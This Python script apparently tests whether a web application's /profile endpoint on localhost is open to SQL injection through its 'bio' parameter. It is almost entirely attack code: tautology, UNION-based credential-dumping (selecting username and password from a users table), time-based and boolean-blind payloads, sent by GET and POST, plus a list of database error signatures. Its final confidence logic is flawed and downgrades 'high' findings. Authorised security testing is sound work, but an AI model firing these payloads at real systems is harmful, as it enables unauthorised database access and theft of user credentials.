#!/usr/bin/env python3
import requests
import json
import sys
import time
import re

def exploit():
    """
    Test for SQL injection vulnerability in the bio parameter of /profile endpoint
    """
    
    # Configuration
    target_url = "http://localhost:3000"
    vuln_id = "profile-sql-injection-bio"
    endpoint = "/profile"
    
    # Initialize result structure
    result = {
        "vulnerability_id": vuln_id,
        "target_url": target_url,
        "endpoint": endpoint,
        "vulnerable": False,
        "confidence": "low",
        "evidence": [],
        "error": None,
        "payloads_tested": []
    }
    
    try:
        # Test basic endpoint accessibility first
        base_url = target_url + endpoint
        
        # Test 1: Baseline request to understand normal behavior
        print(f"Testing baseline request to {base_url}", file=sys.stderr)
        baseline_response = requests.get(base_url, timeout=10)
        baseline_status = baseline_response.status_code
        baseline_content = baseline_response.text
        baseline_time = baseline_response.elapsed.total_seconds()
        
        # SQL injection test payloads
        sql_payloads = [
            # Basic SQL injection tests
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "' AND 1=2 UNION SELECT username,password FROM users--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            
            # Error-based SQL injection
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' UNION SELECT version(),user(),database()--",
            
            # Boolean-based blind SQL injection
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        vulnerable_indicators = [
            "sql syntax",
            "mysql error",
            "ora-",
            "postgresql error",
            "sqlite",
            "syntax error",
            "mysql_fetch",
            "warning: mysql",
            "valid mysql result",
            "quoted string not properly terminated",
            "unclosed quotation mark",
            "microsoft jet database",
            "odbc drivers error",
            "ora-00933",
            "ora-00921",
            "column count doesn't match"
        ]
        
        # Test each payload
        for payload in sql_payloads:
            try:
                print(f"Testing payload: {payload[:50]}...", file=sys.stderr)
                
                # Test as GET parameter
                params = {"bio": payload}
                response = requests.get(base_url, params=params, timeout=10)
                
                payload_result = {
                    "payload": payload,
                    "method": "GET",
                    "parameter": "bio",
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "content_length": len(response.text),
                    "vulnerable_patterns_found": []
                }
                
                # Check for SQL error messages in response
                response_lower = response.text.lower()
                for indicator in vulnerable_indicators:
                    if indicator in response_lower:
                        payload_result["vulnerable_patterns_found"].append(indicator)
                        result["vulnerable"] = True
                        result["confidence"] = "high"
                
                # Check for time-based SQL injection (responses taking significantly longer)
                if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                    if response.elapsed.total_seconds() > baseline_time + 3:
                        payload_result["vulnerable_patterns_found"].append("time_delay_detected")
                        result["vulnerable"] = True
                        result["confidence"] = "medium"
                
                # Check for union-based injection success (different content structure)
                if "UNION SELECT" in payload.upper():
                    if response.status_code == 200 and len(response.text) != len(baseline_content):
                        # Look for structured data patterns that might indicate successful UNION
                        if re.search(r'[a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64}', response.text):
                            payload_result["vulnerable_patterns_found"].append("potential_hash_disclosure")
                            result["vulnerable"] = True
                            result["confidence"] = "medium"
                
                # Check for boolean-based blind SQL injection
                if payload == "' AND 1=1--":
                    true_response_length = len(response.text)
                    true_status = response.status_code
                elif payload == "' AND 1=2--":
                    false_response_length = len(response.text)
                    false_status = response.status_code
                    
                    # Compare true vs false responses
                    if (true_status == 200 and false_status == 200 and 
                        abs(true_response_length - false_response_length) > 10):
                        payload_result["vulnerable_patterns_found"].append("boolean_based_difference")
                        result["vulnerable"] = True
                        result["confidence"] = "medium"
                
                result["payloads_tested"].append(payload_result)
                
                # Also test as POST data
                try:
                    post_response = requests.post(base_url, data={"bio": payload}, timeout=10)
                    
                    post_payload_result = {
                        "payload": payload,
                        "method": "POST",
                        "parameter": "bio",
                        "status_code": post_response.status_code,
                        "response_time": post_response.elapsed.total_seconds(),
                        "content_length": len(post_response.text),
                        "vulnerable_patterns_found": []
                    }
                    
                    # Check POST response for SQL errors
                    post_response_lower = post_response.text.lower()
                    for indicator in vulnerable_indicators:
                        if indicator in post_response_lower:
                            post_payload_result["vulnerable_patterns_found"].append(indicator)
                            result["vulnerable"] = True
                            result["confidence"] = "high"
                    
                    result["payloads_tested"].append(post_payload_result)
                    
                except requests.RequestException as e:
                    print(f"POST request failed for payload {payload}: {str(e)}", file=sys.stderr)
                
                # Small delay between requests to be respectful
                time.sleep(0.1)
                
            except requests.RequestException as e:
                print(f"Request failed for payload {payload}: {str(e)}", file=sys.stderr)
                continue
        
        # Compile evidence
        if result["vulnerable"]:
            evidence = []
            for test in result["payloads_tested"]:
                if test["vulnerable_patterns_found"]:
                    evidence.append({
                        "payload": test["payload"],
                        "method": test["method"],
                        "indicators": test["vulnerable_patterns_found"],
                        "status_code": test["status_code"]
                    })
            result["evidence"] = evidence
        
        # Set final confidence level
        if not result["vulnerable"]:
            result["confidence"] = "low"
        elif any("high" in str(test.get("vulnerable_patterns_found", [])) for test in result["payloads_tested"]):
            result["confidence"] = "high"
        else:
            result["confidence"] = "medium"
            
    except requests.RequestException as e:
        result["error"] = f"Network error: {str(e)}"
        print(f"Network error: {str(e)}", file=sys.stderr)
        
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
        print(f"Unexpected error: {str(e)}", file=sys.stderr)
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))